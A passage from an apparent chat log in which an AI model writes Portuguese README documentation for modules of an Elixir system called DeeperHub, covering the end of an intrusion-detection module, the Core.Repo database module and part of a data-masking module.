*   Testar as ações de resposta (bloqueio de IP, invalidação de sessão) com mocks.
*   Verificar se os alertas são gerados corretamente.
*   Localização: `test/deeper_hub/security/intrusion_detection/`.

### 10.2. Métricas

*   `deeper_hub.security.ids.activities_recorded.count` (tags: `activity_type`)
*   `deeper_hub.security.ids.intrusions_detected.count` (tags: `rule_id`, `severity`, `source_ip_masked`)
*   `deeper_hub.security.ids.alerts_generated.count` (tags: `severity`)
*   `deeper_hub.security.ids.actions_taken.count` (tags: `action_type` (`block_ip`, `invalidate_session`))
*   `deeper_hub.security.ids.rule_engine.processing_time_ms` (Histograma)

### 10.3. Logs

*   **Nível INFO:** Atividades normais sendo processadas (se em modo de depuração verboso).
*   **Nível WARNING:** Atividade suspeita detectada que acionou uma regra de baixa/média severidade.
*   **Nível ERROR/CRITICAL:** Intrusão de alta/crítica severidade detectada. Ação de bloqueio executada. Falha no próprio serviço IDS.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :ids, :activity_analyzed]`
    *   Metadados: `%{activity_type: type, source_ip: ip, user_id: id, rules_triggered: list_of_rule_ids, detection_severity: severity}`
*   `[:deeper_hub, :security, :ids, :response_action_taken]`
    *   Metadados: `%{action: type, target_ip: ip, target_user_id: id, rule_id: id, severity: severity}`

## ❌ 11. Tratamento de Erros

*   Se o `IntrusionDetectionService` falhar ou ficar sobrecarregado, ele não deve impedir o funcionamento normal da aplicação. As chamadas para `record_activity` devem ser \"fire-and-forget\" ou ter timeouts curtos.
*   Falhas na aplicação de uma ação de resposta (ex: erro ao bloquear IP) devem ser logadas e, possivelmente, gerar um alerta secundário.

## 🛡️ 12. Considerações de Segurança (do próprio Módulo)

*   **Segurança das Regras:** O repositório de regras/assinaturas deve ser protegido contra modificações não autorizadas.
*   **Evasão:** Atacantes podem tentar ofuscar suas atividades para evitar a detecção pelas regras atuais. As regras precisam ser atualizadas.
*   **Performance:** Processar um grande volume de atividades em tempo real pode ser custoso. Otimizações, amostragem ou processamento assíncrono para algumas análises podem ser necessários.

## 🧑‍💻 13. Contribuição

*   Novas regras e assinaturas devem ser bem testadas para evitar falsos positivos.
*   A integração de novas fontes de eventos de atividade deve fornecer contexto suficiente para uma análise eficaz.
*   Considere o impacto na performance ao adicionar regras muito complexas.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar um mecanismo de aprendizado para que o IDS possa se adaptar a novos padrões de ataque ou ao comportamento normal do sistema.
*   [ ] Permitir que administradores criem e testem regras customizadas através de uma UI.
*   [ ] Integração com feeds de Threat Intelligence para obter assinaturas de ataques atualizadas.
*   [ ] Desenvolver análises de correlação mais sofisticadas entre diferentes tipos de atividades e ao longo do tempo.
*   [ ] Adicionar a capacidade de \"simular\" a aplicação de regras em dados históricos para testar sua eficácia antes de ativá-las.
*   [ ] Suporte para análise de tráfego de rede mais profunda (requereria integração em nível de infraestrutura, não apenas aplicação).

---

*Última atualização: 2025-05-12*

---

Este módulo IDS é um componente de defesa bastante ativo!

Para o próximo, podemos ir para `DeeperHub.Core.Repo` como sugerido anteriormente, ou talvez outro módulo de segurança como o `DeeperHub.Security.DataMasking` para ver como os dados são protegidos em logs e UI?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Perfeito! Dado que já documentamos o `DeeperHub.Core.Repo`, e ele é uma dependência fundamental para quase todos os outros módulos, vamos prosseguir com ele.

---

# Módulo: `DeeperHub.Core.Repo` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Core.Repo`

O módulo `DeeperHub.Core.Repo` é a **implementação principal do Ecto.Repo** para o sistema DeeperHub. Ele serve como a interface de banco de dados para toda a aplicação, gerenciando conexões, transações e a execução de consultas Ecto.

Através deste módulo, todos os outros componentes do sistema interagem com o banco de dados (ou bancos de dados, se houver múltiplos repositórios configurados para diferentes propósitos) de forma consistente e segura. Ele encapsula a configuração do adaptador de banco de dados (PostgreSQL, MySQL, etc.) e fornece as funcionalidades padrão do Ecto para CRUD (Create, Read, Update, Delete) e consultas complexas. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Interface Ecto.Repo Padrão:**
    *   Implementar o comportamento `Ecto.Repo`.
    *   Fornecer todas as funções padrão do Ecto: `insert/2`, `update/2`, `delete/2`, `get/3`, `get_by/3`, `all/2`, `one/2`, `transaction/2`, `preload/3`, etc.
*   **Gerenciamento de Conexão com Banco de Dados:**
    *   Configurar e gerenciar o pool de conexões com o(s) banco(s) de dados.
    *   Lidar com reconexões e falhas de conexão.
*   **Execução de Consultas Ecto:**
    *   Executar Ecto queries construídas com `Ecto.Query`.
    *   Converter resultados do banco de dados em structs Ecto.
*   **Gerenciamento de Transações:**
    *   Fornecer a capacidade de executar múltiplas operações de banco de dados dentro de uma única transação atômica (`transaction/2`).
    *   Garantir rollback em caso de erro dentro da transação.
*   **Suporte a Migrações Ecto:**
    *   Ser o repositório usado para executar migrações de schema do banco de dados.
*   **Configuração do Adaptador de Banco de Dados:**
    *   Carregar a configuração do adaptador de banco de dados (PostgreSQL, MySQL, SQLite, etc.) a partir das configurações da aplicação.
*   **Observabilidade (via Ecto.LogEntry e Telemetria):**
    *   Ecto já emite eventos de telemetria para consultas (`[:my_app, :repo, :query]`). `DeeperHub.Core.Metrics` e `DeeperHub.Core.Logger` devem ter handlers para capturar esses eventos e registrar métricas de DB (latência, contagem de queries) e logs de queries (especialmente em dev ou para queries lentas).
*   **Suporte a Múltiplos Repositórios (Opcional, se necessário):**
    *   Se a aplicação usar múltiplos bancos de dados para diferentes propósitos, pode haver múltiplos módulos Repo (ex: `Core.Repo.Primary`, `Core.Repo.Analytics`). Este README focará no principal.
*   **Integração com `QueryHelper` e `QueryOptimizer` (Opcional):**
    *   As funções de serviço que usam o `Repo` podem utilizar os utilitários `DeeperHub.Shared.Database.QueryHelper` para aplicar filtros, paginação e ordenação de forma consistente, e `QueryOptimizer` para caching de queries.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Core.Repo` (Módulo Ecto.Repo):**
    *   **Responsabilidade:** É a própria implementação do repositório.
    *   **Configuração:** `use Ecto.Repo, otp_app: :deeper_hub, adapter: Ecto.Adapters.Postgres` (ou outro adaptador).
    *   A configuração detalhada (hostname, username, password, database, pool_size) é geralmente carregada de `config/config.exs`, `config/runtime.exs` ou variáveis de ambiente.
2.  **Adaptador de Banco de Dados Ecto (ex: `Ecto.Adapters.Postgres`):**
    *   Biblioteca externa que lida com a comunicação específica do banco de dados.
3.  **Pool de Conexões (ex: `DBConnection` ou `Postgrex` pool):**
    *   Gerenciado pelo Ecto/adaptador para reutilizar conexões de banco de dados eficientemente.
4.  **Schemas Ecto (Definidos nos módulos de domínio):**
    *   Ex: `DeeperHub.Accounts.Schema.User`, `DeeperHub.Servers.Schema.Server`.
    *   São usados pelo `Repo` para mapear dados de/para o banco de dados.
5.  **`DeeperHub.Release` (ou `lib/deeper_hub/application.ex`):**
    *   Responsável por garantir que o `Repo` seja iniciado como parte da árvore de supervisão da aplicação e que as migrações sejam executadas durante o deploy.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/core/repo.ex          # Implementação do Ecto.Repo principal

priv/repo/
├── migrations/                     # Migrações Ecto
│   └── 20230101000000_create_users.exs
│   └── ...
└── seeds.exs                       # (Opcional) Script para popular dados iniciais
```

### 3.3. Decisões de Design Importantes

*   **Repositório Único vs. Múltiplos:** Para a maioria das aplicações, um único `Repo` principal é suficiente. Múltiplos repos podem ser usados para conectar a diferentes bancos de dados ou para isolar contextos delimitados muito distintos, mas adicionam complexidade.
*   **Consultas Explícitas:** As funções de serviço devem construir e passar `Ecto.Query` explícitas para o `Repo`, em vez de o `Repo` conter lógica de consulta complexa.
*   **Transações para Múltiplas Gravações:** Qualquer operação que envolva múltiplas escritas no banco de dados que devem ser atômicas (ou seja, todas bem-sucedidas ou todas falham) deve ser encapsulada em uma `Repo.transaction/2`.
*   **Segurança:** Nunca construir fragmentos SQL por concatenação de strings. Sempre usar consultas parametrizadas, que o Ecto faz por padrão quando usado corretamente.

## 🛠️ 4. Casos de Uso Principais

*   **Criar um Novo Usuário:**
    *   `DeeperHub.Accounts.UserService` constrói um changeset para um novo usuário.
    *   Chama `DeeperHub.Core.Repo.insert(changeset)`.
*   **Buscar um Servidor pelo ID:**
    *   `DeeperHub.Servers.Storage` chama `DeeperHub.Core.Repo.get(DeeperHub.Servers.Schema.Server, server_id)`.
*   **Listar Todas as Avaliações Ativas para um Servidor (com paginação e ordenação):**
    *   `DeeperHub.ServerReviews.Storage` constrói uma `Ecto.Query`:
        ```elixir
        from(r in Review,
          where: r.server_id == ^server_id and r.is_active == true,
          order_by: [desc: r.inserted_at],
          limit: ^limit,
          offset: ^offset
        ) |> DeeperHub.Core.Repo.all()
        ```
*   **Registrar um Usuário e seu Perfil Atomicamente:**
    *   `DeeperHub.Accounts.RegistrationService` usa `DeeperHub.Core.Repo.transaction(fn -> ... end)` para garantir que tanto o usuário quanto o perfil sejam criados, ou nenhum deles se ocorrer um erro.

## 🌊 5. Fluxos Importantes

### Fluxo de uma Consulta `Repo.all/2`

1.  **Módulo de Serviço/Storage:** Constrói uma `Ecto.Query.t()` (ex: `query = from(u in User, where: u.active == true)`).
2.  **Chamada ao Repo:** Chama `DeeperHub.Core.Repo.all(query)`.
3.  **`DeeperHub.Core.Repo`:**
    *   Obtém uma conexão do pool de conexões.
    *   O adaptador Ecto (ex: `Postgrex`) traduz a `Ecto.Query` para uma consulta SQL parametrizada.
    *   Envia a consulta SQL para o servidor de banco de dados.
4.  **Banco de Dados:** Executa a consulta e retorna os resultados.
5.  **`DeeperHub.Core.Repo`:**
    *   O adaptador Ecto recebe os resultados brutos.
    *   Converte os resultados em uma lista de structs Ecto (ex: `[%User{}, %User{}, ...]`).
    *   Libera a conexão de volta para o pool.
    *   Retorna a lista de structs para o chamador.
    *   Eventos Telemetry (`[:deeper_hub, :repo, :query]`) são emitidos pelo Ecto.

### Fluxo de uma `Repo.transaction/2`

1.  **Módulo de Serviço:** Chama `DeeperHub.Core.Repo.transaction(fn repo_inside_transaction -> ... end)`.
2.  **`DeeperHub.Core.Repo`:**
    *   Obtém uma conexão do pool e a marca como estando em uma transação.
    *   Inicia uma transação no banco de dados (ex: `BEGIN`).
    *   Executa a função anônima passada, fornecendo uma instância do `Repo` que opera dentro dessa transação (`repo_inside_transaction`).
3.  **Função Anônima:**
    *   Executa múltiplas operações de banco de dados usando `repo_inside_transaction` (ex: `repo_inside_transaction.insert(cs1)`, `repo_inside_transaction.update(cs2)`).
    *   Se todas as operações forem bem-sucedidas, a função retorna `{:ok, result_value}`.
    *   Se qualquer operação falhar (ex: changeset inválido, erro do DB), a função pode retornar `{:error, reason}` ou o `Repo` pode levantar uma exceção. É comum usar `Repo.insert!/update!/delete!` dentro de transações para que um erro cause um rollback automático.
4.  **`DeeperHub.Core.Repo` (Conclusão da Transação):**
    *   Se a função retornou `{:ok, result_value}`:
        *   Confirma a transação no banco de dados (ex: `COMMIT`).
        *   Retorna `{:ok, result_value}` para o chamador original.
    *   Se a função retornou `{:error, reason}` ou levantou uma exceção que o `Repo.transaction` captura:
        *   Cancela a transação no banco de dados (ex: `ROLLBACK`).
        *   Retorna `{:error, reason}` (ou propaga a exceção, dependendo de como a transação foi configurada).
    *   Libera a conexão de volta para o pool.
    *   Eventos Telemetry são emitidos para o início, fim (commit/rollback) da transação.

## 📡 6. API (Funções Ecto.Repo Padrão)

O `DeeperHub.Core.Repo` expõe todas as funções padrão do `Ecto.Repo`. As mais comuns incluem:

*   `insert(changeset_or_struct, opts \\\\ [])`
*   `insert!(changeset_or_struct, opts \\\\ [])`
*   `update(changeset_or_struct, opts \\\\ [])`
*   `update!(changeset_or_struct, opts \\\\ [])`
*   `delete(struct, opts \\\\ [])`
*   `delete!(struct, opts \\\\ [])`
*   `get(schema_module, id, opts \\\\ [])`
*   `get!(schema_module, id, opts \\\\ [])`
*   `get_by(schema_module, clauses, opts \\\\ [])`
*   `get_by!(schema_module, clauses, opts \\\\ [])`
*   `all(queryable, opts \\\\ [])`
*   `one(queryable, opts \\\\ [])`
*   `one!(queryable, opts \\\\ [])`
*   `transaction(fun, opts \\\\ [])`
*   `preload(structs_or_struct, preloads, opts \\\\ [])`
*   `exists?(queryable)`
*   `aggregate(queryable, aggregate_op, field, opts \\\\ [])`

*Para a documentação completa de cada função, consulte a documentação oficial do Ecto.*

## ⚙️ 7. Configuração

A configuração do `DeeperHub.Core.Repo` é feita principalmente através dos arquivos de configuração do Elixir (`config/config.exs`, `config/dev.exs`, `config/prod.exs`, `config/runtime.exs`) e variáveis de ambiente.

**Exemplo (`config/runtime.exs` para produção):**
```elixir
import Config

if config_env() == :prod do
  database_url =
    System.get_env(\"DATABASE_URL\") ||
      raise \"\"\"
      environment variable DATABASE_URL is missing.
      For example: ecto://USER:PASS@HOST/DATABASE
      \"\"\"

  config :deeper_hub, DeeperHub.Core.Repo,
    url: database_url,
    pool_size: String.to_integer(System.get_env(\"POOL_SIZE\") || \"10\"),
    ssl: String.to_atom(System.get_env(\"DATABASE_SSL\") || \"false\"), # ex: true, ou [certfile: \"path/to/cert.pem\"]
    # Outras opções de produção, como timeouts
    socket_options: maybe_ipv6(System.get_env(\"DATABASE_SOCKET_OPTIONS\"))

  # Helper para socket_options
  defp maybe_ipv6(nil), do: []
  defp maybe_ipv6(\"ipv6\"), do: [:inet6]
  defp maybe_ipv6(_), do: []
end
```

**Configurações Chave:**
*   `:otp_app`: `:deeper_hub` (indica que as configurações do repo estão sob a app `:deeper_hub`).
*   `:adapter`: (ex: `Ecto.Adapters.Postgres`).
*   `:url` ou `:hostname`, `:username`, `:password`, `:database`: Credenciais de conexão.
*   `:pool_size`: Número de conexões no pool.
*   `:ssl`: Configurações de SSL para a conexão.
*   Outras opções específicas do adaptador e do pool.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   Todos os módulos que definem `Ecto.Schema`.
*   Todos os módulos de serviço/storage que executam operações de banco de dados.
*   `DeeperHub.Core.ConfigManager`: Para obter a string de conexão e outras configurações do Repo em tempo de execução (se usando `Config.Provider`).

### 8.2. Bibliotecas Externas

*   `Ecto` (especificamente `ecto_sql` para bancos SQL).
*   O adaptador de banco de dados específico (ex: `postgrex` para PostgreSQL, `myxql` para MySQL).
*   `DBConnection`: Para gerenciamento do pool de conexões.

## 🤝 9. Como Usar / Integração

O `DeeperHub.Core.Repo` é usado em toda a aplicação onde a persistência de dados é necessária.

**Exemplo em um módulo de serviço:**
```elixir
defmodule DeeperHub.Accounts.UserService do
  alias DeeperHub.Core.Repo
  alias DeeperHub.Accounts.Schema.User
  import Ecto.Query

  def get_user_by_id(user_id) do
    Repo.get(User, user_id) # Retorna %User{} ou nil
  end

  def create_user(attrs) do
    %User{}
    |> User.changeset(attrs)
    |> Repo.insert() # Retorna {:ok, %User{}} ou {:error, %Ecto.Changeset{}}
  end

  def list_active_users() do
    from(u in User, where: u.is_active == true)
    |> Repo.all()
  end
end
```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Os testes para o `Repo` em si são geralmente cobertos pelos testes do Ecto.
*   Os testes dos módulos de serviço/storage que *usam* o `Repo` devem verificar se os dados são persistidos e recuperados corretamente.
*   Usar o `Ecto.Adapters.SQL.Sandbox` para testes de banco de dados é a prática padrão para garantir isolamento e limpeza automática.
*   Localização: Os testes que interagem com o Repo estarão nos diretórios de teste dos módulos que o utilizam (ex: `test/deeper_hub/accounts/user_service_test.exs`).

### 10.2. Métricas

Ecto emite eventos Telemetry que podem ser usados para derivar métricas (via `DeeperHub.Core.Metrics` com handlers apropriados):
*   `deeper_hub.core.repo.query.total.count` (tags: `source` (nome da tabela/schema), `action` (`select`, `insert`, `update`, `delete`))
*   `deeper_hub.core.repo.query.duration_ms` (Histograma, tags: `source`, `action`)
*   `deeper_hub.core.repo.query.idle_time_ms` (Histograma): Tempo que uma conexão ficou ociosa antes de ser usada.
*   `deeper_hub.core.repo.query.queue_time_ms` (Histograma): Tempo que uma query esperou por uma conexão disponível.
*   `deeper_hub.core.repo.transaction.duration_ms` (Histograma)
*   `deeper_hub.core.repo.pool.size.gauge` (Gauge): Tamanho atual do pool.
*   `deeper_hub.core.repo.pool.checked_out.gauge` (Gauge): Conexões em uso.
*   `deeper_hub.core.repo.pool.overflow.count` (Contador): Número de vezes que o pool excedeu o tamanho.

### 10.3. Logs

*   Ecto pode ser configurado para logar todas as queries SQL executadas (`log_queries: true` na configuração do Repo, geralmente apenas para desenvolvimento).
*   Queries lentas podem ser logadas com um nível mais alto (ex: WARNING) se um limiar for excedido.
*   Erros de conexão com o banco de dados.
*   Erros de transação (rollbacks).

### 10.4. Telemetria

Ecto emite eventos Telemetry padrão para operações de banco de dados. Os principais são:
*   `[:your_app, :repo, :query]` (onde `:your_app` é `:deeper_hub`):
    *   **Medições:** `:query_time`, `:decode_time`, `:queue_time`, `:idle_time`, `:total_time` (todos em `native` time units).
    *   **Metadados:** `:repo`, `:type` (`:ecto_sql | :ecto_mongodb | ...`), `:source` (nome da tabela/schema), `:action` (`:select | :insert | ...`), `:result` (`{:ok, term} | {:error, term}`), `:query` (a query Ecto), `:params`, `:stacktrace`.
*   Para transações, eventos como `[:your_app, :repo, :transaction]` são emitidos.

## ❌ 11. Tratamento de Erros

*   Funções do `Repo` como `insert`, `update`, `delete` retornam `{:ok, struct}` ou `{:error, changeset}`.
*   Funções \"bang\" (`insert!`, `update!`, `delete!`, `get!`, `one!`) levantam exceções em caso de erro (ex: `Ecto.InvalidChangesetError`, `Ecto.NoResultsError`). Estas são úteis dentro de transações para forçar um rollback.
*   Erros de conexão com o banco de dados podem levantar exceções como `DBConnection.ConnectionError`. A aplicação (ou o pool de conexões) geralmente tenta reconectar.
*   `Repo.transaction` retorna `{:ok, value}` se a função interna retornar `{:ok, value}`, e `{:error, reason}` se a função interna retornar `{:error, reason}` ou `Repo.rollback(reason)`.

## 🛡️ 12. Considerações de Segurança

*   **Prevenção de Injeção de SQL:** A principal responsabilidade de segurança do `Repo` é facilitar o uso de consultas parametrizadas. **Nunca interpolar dados de entrada do usuário diretamente em strings de consulta SQL.** Use `^` para interpolar variáveis em queries Ecto ou passe parâmetros para `Ecto.Adapters.SQL.query/4`.
*   **Credenciais de Acesso:** As credenciais do banco de dados devem ser gerenciadas de forma segura (ex: variáveis de ambiente, cofres de segredos) e não hardcoded.
*   **Permissões do Usuário do Banco de Dados:** O usuário do banco de dados configurado para a aplicação deve ter apenas as permissões necessárias (princípio do menor privilégio).
*   **Dados Sensíveis:** Se o banco de dados armazenar dados sensíveis, considere criptografia em nível de coluna (usando tipos Ecto customizados como `DeeperHub.Shared.Encryption.EncryptedType`) ou criptografia em nível de banco de dados (TDE).

## 🧑‍💻 13. Contribuição

*   Mantenha a lógica de consulta complexa fora do módulo `Repo`. Coloque-a em módulos de contexto/serviço.
*   Sempre use changesets para validar dados antes de `insert` ou `update`.
*   Use transações para operações que envolvem múltiplas escritas atômicas.
*   Monitore a performance das queries e adicione índices no banco de dados conforme necessário.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Configurar read replicas e um `Repo.ReadOnly` para desviar tráfego de leitura e aliviar o banco de dados primário, se a carga justificar.
*   [ ] Implementar estratégias de retry mais sofisticadas para operações de banco de dados em caso de deadlocks ou falhas transitórias.
*   [ ] Explorar o uso de `Ecto.Multi` para compor operações de banco de dados mais complexas de forma transacional.
*   [ ] Adicionar uma camada de \"data sharding\" se a aplicação precisar escalar para volumes de dados muito grandes.
*   [ ] Melhorar a observabilidade com tracing distribuído para queries Ecto, ligando-as a traces de requisições HTTP.

---

*Última atualização: 2025-05-12*

---

Com o `Core.Repo` documentado, cobrimos a principal interface de persistência.

Para o próximo, podemos voltar para a camada de segurança e abordar `DeeperHub.Security.DataMasking` ou `ResponseSanitizer`, ou talvez começar a detalhar um módulo de domínio como `DeeperHub.Servers`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue
"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos seguir com `DeeperHub.Security.DataMasking`. Este módulo é crucial para proteger dados sensíveis quando eles precisam ser exibidos ou logados.

---

# Módulo: `DeeperHub.Security.DataMasking` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Security.DataMasking`

O módulo `DeeperHub.Security.DataMasking` é responsável por **mascarar (ou ofuscar) dados sensíveis** dentro do sistema DeeperHub. O objetivo é proteger informações confidenciais de serem expostas em logs, interfaces de usuário (especialmente para administradores ou suporte), relatórios ou qualquer outro local onde o dado completo não seja estritamente necessário.

Ele fornece funcionalidades para mascarar diferentes tipos de dados, como CPFs, números de cartão de crédito, emails, telefones, e também permite mascarar campos específicos dentro de estruturas de dados maiores (mapas). Este módulo ajuda a cumprir com regulamentações de privacidade (como LGPD/GDPR) e a reduzir o risco de vazamento de dados. 😊

*(Nota: A documentação original tinha `DeeperHub.Security.DataMasking.DataMaskingService` e `DataMaskingFacade`. Esta documentação consolida a fachada principal em `DeeperHub.Security.DataMasking` e a lógica no `DataMaskingService`.)*

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Mascaramento de Tipos de Dados Específicos:**
    *   Mascarar números de CPF/CNPJ (`mask_cpf/2`).
    *   Mascarar números de cartão de crédito (`mask_credit_card/2`).
    *   Mascarar endereços de email (`mask_email/2`).
    *   Mascarar números de telefone (`mask_phone/2`).
    *   (Extensível) Mascarar outros tipos de documentos ou identificadores.
*   **Mascaramento Genérico de Strings:**
    *   Aplicar mascaramento a strings genéricas, mantendo uma porção visível (ex: primeiros/últimos N caracteres).
*   **Mascaramento de Dados em Estruturas (Mapas/Structs):**
    *   Mascarar valores de chaves específicas dentro de mapas ou structs (`mask_sensitive_map/3`).
    *   Suporte a mascaramento recursivo em estruturas aninhadas.
*   **Mascaramento para Logs (`mask_for_log/2`):**
    *   Uma função de conveniência para aplicar mascaramento a dados (strings ou mapas) antes de serem enviados para o `Core.Logger`.
    *   Identificar automaticamente e mascarar dados sensíveis comuns em strings de log.
*   **Configurabilidade de Padrões de Mascaramento:**
    *   Permitir a configuração de como cada tipo de dado é mascarado (ex: quantos dígitos do cartão de crédito manter visíveis, qual parte do email ofuscar).
    *   Definir o caractere de mascaramento (ex: `*`, `#`, `X`).
*   **Políticas de Mascaramento Contextuais (Opcional):**
    *   Permitir diferentes níveis ou estilos de mascaramento dependendo do contexto ou do papel do usuário que está visualizando os dados.
*   **Integração com `LogSanitizer` e `ResponseSanitizer`:**
    *   Este módulo pode ser usado internamente por `LogSanitizer` e `ResponseSanitizer` para aplicar as regras de mascaramento.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.DataMasking` (Fachada Pública):**
    *   Ponto de entrada para todas as operações de mascaramento.
    *   Delega para o `DataMaskingService`.
2.  **`DeeperHub.Security.DataMasking.Services.DataMaskingService` (Módulo Funcional):**
    *   **Responsabilidade:** Contém a lógica principal para aplicar as diferentes técnicas de mascaramento.
    *   Não gerencia estado, as regras de mascaramento são obtidas do `Core.ConfigManager` ou passadas como opções.
    *   Utiliza regex e manipulação de strings para realizar o mascaramento.
    *   **Interações:**
        *   `DeeperHub.Core.ConfigManager`: Para obter padrões de mascaramento padrão, caracteres de substituição, etc.
3.  **Configurações (via `DeeperHub.Core.ConfigManager` e `DeeperHub.Security.Policy.SecurityPolicyManager`):**
    *   Padrões de regex para identificar dados a serem mascarados (ex: regex para CPF, Cartão).
    *   Formatos de mascaramento (ex: `cpf_mask: \"###.***.***-##\"`).
    *   Lista de chaves sensíveis padrão para `mask_sensitive_map/3` e `mask_for_log/2`.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/security/data_masking/
├── data_masking.ex                 # Fachada Pública
│
└── services/
    └── data_masking_service.ex     # Lógica principal de mascaramento
```
*(Este módulo tende a ser mais funcional e pode não necessitar de GenServers ou supervisores próprios, a menos que haja uma necessidade de gerenciar dinamicamente regras complexas de mascaramento com estado.)*

### 3.3. Decisões de Design Importantes

*   **Não Reversível:** O mascaramento é uma operação de mão única; os dados originais não devem ser recuperáveis a partir da versão mascarada.
*   **Equilíbrio entre Utilidade e Segurança:** O mascaramento deve ocultar informações suficientes para proteger a privacidade, mas ainda pode deixar partes visíveis para fins de identificação ou depuração (ex: últimos 4 dígitos do cartão).
*   **Consistência:** Os mesmos tipos de dados devem ser mascarados de forma consistente em toda a aplicação.
*   **Performance:** As funções de mascaramento devem ser eficientes, especialmente se aplicadas a grandes volumes de dados ou em caminhos críticos de log/resposta.

## 🛠️ 4. Casos de Uso Principais

*   **Exibição de Dados de Usuário em Painel de Suporte:**
    *   Um agente de suporte visualiza os detalhes de um usuário.
    *   Antes de exibir, o serviço chama `DataMasking.mask_cpf(user.cpf)`, `DataMasking.mask_email(user.email)`.
*   **Registro de Log de uma Transação:**
    *   O módulo financeiro vai logar os detalhes de uma transação.
    *   Chama `Core.Logger.info(\"Transação processada\", DataMasking.mask_for_log(transaction_details, sensitive_keys: [:credit_card_number, :cvv]))`.
*   **Resposta de API com Dados Parcialmente Sensíveis:**
    *   Uma API retorna informações de um pedido, incluindo os últimos 4 dígitos do cartão.
    *   O controller, antes de enviar a resposta, chama `DataMasking.mask_credit_card(full_card_number, visible_digits: 4, preserve_brand: true)`.

## 🌊 5. Fluxos Importantes

### Fluxo de Mascaramento de um Mapa de Dados para Log

1.  **Módulo Chamador:** Tem um mapa `data = %{user_id: 1, action: \"login\", details: %{ip: \"1.2.3.4\", password_attempt: \"secret123\"}}`.
2.  Prepara para logar: `Logger.info(\"Tentativa de Login\", DataMasking.mask_for_log(data, sensitive_keys: [:password_attempt]))`.
3.  **`DataMasking.mask_for_log/2` (Fachada):**
    *   Delega para `DataMaskingService.mask_sensitive_map(data, [:password_attempt], opts)`.
4.  **`DataMaskingService.mask_sensitive_map/3`:**
    *   Itera sobre as chaves do mapa.
    *   Se uma chave está na lista `sensitive_keys` (ou em uma lista padrão de chaves sensíveis configurada):
        *   Substitui seu valor por um placeholder (ex: `\"[REDACTED]\"` ou `\"[MASKED]\"`).
    *   Se um valor for um mapa aninhado e a opção recursiva estiver ativa, chama-se recursivamente.
    *   Se um valor for uma string e a opção de detectar padrões sensíveis em strings estiver ativa, pode chamar `mask_sensitive_data/2` nessa string.
5.  **Resultado:** O mapa mascarado é retornado (ex: `%{user_id: 1, action: \"login\", details: %{ip: \"1.2.3.4\", password_attempt: \"[REDACTED]\"}}`) e passado para o `Core.Logger`.

## 📡 6. API (Funções Públicas da Fachada)

*(Baseado na documentação original, com alguns refinamentos e adições)*

### 6.1. `DeeperHub.Security.DataMasking.mask_sensitive_data(text :: String.t(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}`

*   **Descrição:** Tenta identificar e mascarar automaticamente vários tipos de dados sensíveis (CPF, email, cartão, etc.) dentro de uma string de texto livre.
*   **`opts`:**
    *   `:types_to_mask` (list(atom)): Lista de tipos a procurar (ex: `[:cpf, :email, :credit_card]`). Se omitido, tenta todos os tipos configurados.
    *   `:mask_char` (String.t): Caractere a ser usado para mascaramento. (Padrão: `*`)
    *   `:custom_patterns` (map): Mapa de `{type_atom, regex}` para padrões de detecção customizados.
*   **Exemplo:**
    ```elixir
    text = \"Contato: joao@example.com, CPF: 123.456.789-00.\"
    {:ok, masked} = DataMasking.mask_sensitive_data(text)
    # masked poderia ser \"Contato: j***@e******.com, CPF: ***.***.***-00.\"
    ```

### 6.2. `DeeperHub.Security.DataMasking.mask_sensitive_map(data_map :: map(), sensitive_keys :: list(atom() | String.t()), opts :: keyword()) :: {:ok, map()} | {:error, term()}`

*   **Descrição:** Mascara os valores das chaves especificadas em `sensitive_keys` dentro de `data_map`.
*   **`opts`:**
    *   `:replacement_value` (String.t): Valor a ser usado para substituição. (Padrão: `\"[REDACTED]\"`)
    *   `:recursive` (boolean): Se deve aplicar o mascaramento a mapas aninhados. (Padrão: `true`)
    *   `:apply_type_specific_masking` (boolean): Se `true`, para chaves conhecidas (ex: `:email`, `:cpf`), tenta aplicar mascaramento específico do tipo em vez de apenas `replacement_value`. (Padrão: `false`)

### 6.3. Funções Específicas de Tipo:

*   **`DeeperHub.Security.DataMasking.mask_email(email :: String.t(), opts :: keyword()) :: {:ok, String.t()}`**
    *   `opts`: `:visible_prefix_chars` (int, Padrão: 1), `:visible_domain_chars` (int, Padrão: 0), `:preserve_domain_extension` (bool, Padrão: true).
    *   Ex: `j***@e******.com`
*   **`DeeperHub.Security.DataMasking.mask_cpf(cpf :: String.t(), opts :: keyword()) :: {:ok, String.t()}`**
    *   `opts`: `:visible_digits_start` (int, Padrão: 3), `:visible_digits_end` (int, Padrão: 2).
    *   Ex: `***.456.789-**` ou `123.***.***-00`.
*   **`DeeperHub.Security.DataMasking.mask_credit_card(card_number :: String.t(), opts :: keyword()) :: {:ok, String.t()}`**
    *   `opts`: `:visible_last_digits` (int, Padrão: 4), `:visible_first_digits` (int, Padrão: 0 ou 6 para preservar BIN).
    *   Ex: `****-****-****-3456`.
*   **`DeeperHub.Security.DataMasking.mask_phone(phone :: String.t(), opts :: keyword()) :: {:ok, String.t()}`**
    *   `opts`: `:visible_last_digits` (int, Padrão: 4), `:preserve_prefix_chars` (int, Padrão: 0, mas pode ser usado para DDD + código país).
    *   Ex: `(11) *****-4321`.

### 6.4. `DeeperHub.Security.DataMasking.mask_for_log(data :: String.t() | map(), opts :: keyword()) :: String.t() | map()`

